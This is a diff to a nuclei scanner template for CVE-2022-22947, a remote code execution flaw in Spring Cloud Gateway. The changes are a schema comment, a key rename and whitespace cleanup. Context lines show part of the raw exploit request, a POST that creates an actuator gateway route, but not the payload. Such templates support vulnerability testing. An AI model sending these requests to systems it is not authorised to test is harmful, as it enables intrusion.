@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: spring_cloud_gateway_CVE_2022_22947
 
 info:
@@ -9,7 +10,7 @@ info:
     - https://51pwn.com
   tags: spring,CVE-2022-22947,RCE,web,gateway,actuator
 
-requests:
+http:
   - raw:
       - |+
         POST /actuator/gateway/routes/hack_51pwn_com HTTP/1.1
@@ -66,10 +67,10 @@ requests:
         Content-Type: application/x-www-form-urlencoded
         Content-Length: 0
         User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
-       
-        
-       
-        
+
+
+
+
       # end payload
     unsafe: true
     pipeline: true
